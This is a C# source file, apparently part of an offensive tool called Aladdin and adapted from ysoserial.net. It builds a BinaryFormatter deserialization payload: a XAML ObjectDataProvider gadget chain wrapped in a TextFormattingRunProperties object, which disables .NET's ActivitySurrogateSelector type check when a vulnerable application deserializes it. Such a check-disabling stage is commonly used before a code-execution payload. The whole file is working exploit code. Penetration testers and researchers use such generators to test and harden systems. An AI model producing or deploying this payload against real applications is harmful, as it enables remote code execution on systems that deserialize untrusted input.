using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace Aladdin
{
    [Serializable]
    //Code from https://github.com/pwntester/ysoserial.net/blob/d5a268b1d0229acb2f00a9ffb0fbe857da441c08/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs#L11
    //https://github.com/pwntester/ysoserial.net/blob/d5a268b1d0229acb2f00a9ffb0fbe857da441c08/ysoserial/Generators/ObjectDataProviderGenerator.cs#L572
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        private readonly string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            info.SetType(t);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    internal class ActivitySurrogateDisableTypeCheckGenerator
    {
        //Code from https://github.com/pwntester/ysoserial.net/blob/d5a268b1d0229acb2f00a9ffb0fbe857da441c08/ysoserial/Generators/ActivitySurrogateDisableTypeCheck.cs#L56
        public MemoryStream Generate(MemoryStream memory_stream)
        {
            string xaml_payload = @"<ResourceDictionary
            xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
            xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
            xmlns:s=""clr-namespace:System;assembly=mscorlib""
            xmlns:c=""clr-namespace:System.Configuration;assembly=System.Configuration""
            xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
                <ObjectDataProvider x:Key=""type"" ObjectType=""{x:Type s:Type}"" MethodName=""GetType"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""field"" ObjectInstance=""{StaticResource type}"" MethodName=""GetField"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
                        <r:BindingFlags>40</r:BindingFlags>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""set"" ObjectInstance=""{StaticResource field}"" MethodName=""SetValue"">
                    <ObjectDataProvider.MethodParameters>
                        <s:Object/>
                        <s:Boolean>true</s:Boolean>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{x:Static c:ConfigurationManager.AppSettings}"" MethodName =""Set"">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
                        <s:String>true</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>";

            object payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(memory_stream, payload);
            return memory_stream;
        }

    }
}


